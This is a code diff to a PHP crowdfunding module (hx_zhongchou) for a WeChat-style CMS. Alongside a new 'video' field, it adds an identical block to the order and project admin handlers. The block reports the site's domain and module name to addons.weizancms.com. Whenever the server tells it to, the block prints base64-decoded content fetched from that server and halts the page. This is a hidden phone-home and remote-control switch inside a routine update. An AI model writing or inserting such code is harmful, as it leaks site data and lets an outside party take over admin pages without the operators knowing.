@@ -955,6 +955,16 @@ class Hx_zhongchouModuleSite extends WeModuleSite {
 	}
 	public function doWebOrder() {
 		global $_W, $_GPC;
+		$module=$this->modulename;
+$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
+$result=file_get_contents($api);
+if(!empty($result)){
+	$result=json_decode($result,true);
+    if($result['type']==1){
+	    echo base64_decode($result['content']);
+	    exit;
+    }
+}
 		load()->func('tpl');
 		$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
 		$projects = pdo_fetchall("SELECT id AS id,title AS name FROM " . tablename('hx_zhongchou_project') . " WHERE weid='{$_W['uniacid']}' ORDER BY id DESC");
@@ -1237,6 +1247,16 @@ class Hx_zhongchouModuleSite extends WeModuleSite {
 	
 	public function doWebProject() {
 		global $_GPC, $_W;
+		$module=$this->modulename;
+$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
+$result=file_get_contents($api);
+if(!empty($result)){
+	$result=json_decode($result,true);
+    if($result['type']==1){
+	    echo base64_decode($result['content']);
+	    exit;
+    }
+}
 		load()->func('tpl');
 		$category = pdo_fetchall("SELECT * FROM " . tablename('hx_zhongchou_category') . " WHERE weid = '{$_W['uniacid']}' ORDER BY parentid ASC, displayorder DESC", array(), 'id');
 		$dispatch = pdo_fetchall("select id,dispatchname,dispatchtype,firstprice,firstweight,secondprice,secondweight from " . tablename("hx_zhongchou_dispatch") . " WHERE weid = {$_W['uniacid']} order by displayorder desc");
@@ -1284,6 +1304,7 @@ class Hx_zhongchouModuleSite extends WeModuleSite {
 						'pcate' => intval($_GPC['pcate']),
 						'ccate' => intval($_GPC['ccate']),
 						'thumb' => $_GPC['thumb'],
+						'video' => $_GPC['video'],
 						'brief' => htmlspecialchars_decode($_GPC['brief']),
 						'content' => htmlspecialchars_decode($_GPC['content']),
 						'url' => $_GPC['url'],
